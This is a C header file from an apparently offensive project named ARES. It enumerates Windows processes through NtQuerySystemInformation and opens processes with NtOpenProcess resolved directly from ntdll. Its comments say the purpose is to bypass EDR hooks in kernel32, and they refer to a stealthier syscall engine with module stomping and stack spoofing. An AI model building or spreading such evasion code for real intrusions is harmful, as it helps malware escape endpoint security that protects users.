/*
 * proc_enum.h — Inline process enumeration via NtQuerySystemInformation.
 *
 * Replaces CreateToolhelp32Snapshot / TH32CS_SNAPPROCESS throughout the
 * codebase. Call PROC_ENUM_START(var) / PROC_ENUM_END(var).
 *
 * Usage:
 *   PROC_ENUM_START(pe) {
 *       if (_stricmp(pe->name, "chrome.exe") == 0) {
 *           DWORD pid = pe->pid;
 *       }
 *   } PROC_ENUM_END(pe)
 *
 * Fields available per entry (PROC_ENTRY*):
 *   pe->name  — char[260]  process image name (UTF-8)
 *   pe->pid   — DWORD
 */

#ifndef ARES_PROC_ENUM_H
#define ARES_PROC_ENUM_H

#include <windows.h>

typedef struct _PROC_ENTRY {
    char  name[260];
    DWORD pid;
} PROC_ENTRY;

/* Internal: snapshot buffer */
typedef struct _PROC_SNAP {
    BYTE* buf;
    ULONG size;
} PROC_SNAP;

static inline PROC_SNAP _proc_snap_alloc(void) {
    PROC_SNAP snap = {0};
    typedef NTSTATUS (NTAPI *PNtQSI)(ULONG,PVOID,ULONG,PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PNtQSI fn = (PNtQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!fn) return snap;
    ULONG sz = 0x20000;
    for (int i = 0; i < 6; i++) {
        snap.buf = (BYTE*)VirtualAlloc(NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!snap.buf) return snap;
        ULONG need = 0;
        NTSTATUS st = fn(5 /*SystemProcessInformation*/, snap.buf, sz, &need);
        if (st == 0) { snap.size = sz; return snap; }
        VirtualFree(snap.buf, 0, MEM_RELEASE); snap.buf = NULL;
        if (st == 0xC0000004L) { sz = need + 0x1000; } else return snap;
    }
    return snap;
}

static inline void _proc_snap_free(PROC_SNAP* s) {
    if (s->buf) { VirtualFree(s->buf, 0, MEM_RELEASE); s->buf = NULL; }
}

/*
 * PROC_ENUM_START(entry_var) / PROC_ENUM_END(entry_var)
 *
 * Allocates snapshot on entry, walks entries, frees on exit.
 * 'entry_var' is declared as PROC_ENTRY _pe; caller uses _pe.name / _pe.pid
 */
#define PROC_ENUM_START(pe)                                                 \
    {                                                                        \
        PROC_SNAP _snap = _proc_snap_alloc();                               \
        PROC_ENTRY pe = {0};                                                \
        typedef struct { ULONG Next; ULONG Thr; BYTE R[48];                 \
                         struct{USHORT L,M;PWSTR B;} Img;                   \
                         LONG Pri; HANDLE Pid; } _SPI;                      \
        _SPI* _e = (_SPI*)_snap.buf;                                        \
        while (_snap.buf && _e) {                                           \
            if (_e->Img.B && _e->Img.L) {                                   \
                WideCharToMultiByte(CP_UTF8,0,_e->Img.B,_e->Img.L/2,       \
                    pe.name,259,NULL,NULL);                                  \
                pe.name[259]='\0';                                           \
                pe.pid = (DWORD)(ULONG_PTR)_e->Pid;

#define PROC_ENUM_END(pe)                                                   \
            }                                                                \
            if (!_e->Next) break;                                            \
            _e = (_SPI*)((BYTE*)_e + _e->Next);                             \
        }                                                                    \
        _proc_snap_free(&_snap);                                             \
    }

/* Helper: find single PID by name */
static inline DWORD proc_find_pid(const char* name) {
    DWORD found = 0;
    PROC_ENUM_START(pe) {
        if (_stricmp(pe.name, name) == 0) { found = pe.pid; break; }
    } PROC_ENUM_END(pe)
    return found;
}

/* Helper: find all PIDs matching name (multi-instance), returns count */
static inline int proc_find_all(const char* name, DWORD* pids, int max) {
    int count = 0;
    PROC_ENUM_START(pe) {
        if (_stricmp(pe.name, name) == 0 && count < max)
            pids[count++] = pe.pid;
    } PROC_ENUM_END(pe)
    return count;
}

/* ═══════════════════════════════════════════════════════════════
 *  v3.7 FIX-05: Lightweight NtOpenProcess (no AGENT_STATE needed)
 *
 *  Resolves NtOpenProcess directly from ntdll.dll — bypasses the
 *  Win32 OpenProcess() hook that EDR places in kernel32/kernelbase.
 *  Not as stealthy as the indirect syscall engine (no module stomping,
 *  no stack spoofing) but eliminates the primary hook vector.
 *
 *  Usage: HANDLE h = _nt_open_process(pid, PROCESS_TERMINATE);
 * ═══════════════════════════════════════════════════════════════ */

typedef struct _NT_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} NT_CLIENT_ID;

typedef struct _NT_OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PVOID           ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} NT_OBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI *pfn_NtOpenProcess)(
    PHANDLE, ACCESS_MASK, NT_OBJECT_ATTRIBUTES*, NT_CLIENT_ID*);

static pfn_NtOpenProcess _g_pNtOP = NULL;

static inline HANDLE _nt_open_process(DWORD pid, ACCESS_MASK access) {
    if (!_g_pNtOP) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) _g_pNtOP = (pfn_NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
        if (!_g_pNtOP) return NULL;
    }
    HANDLE hProc = NULL;
    NT_OBJECT_ATTRIBUTES oa = { sizeof(NT_OBJECT_ATTRIBUTES), 0 };
    NT_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, 0 };
    NTSTATUS st = _g_pNtOP(&hProc, access, &oa, &cid);
    return (st == 0) ? hProc : NULL;
}

#endif /* ARES_PROC_ENUM_H */
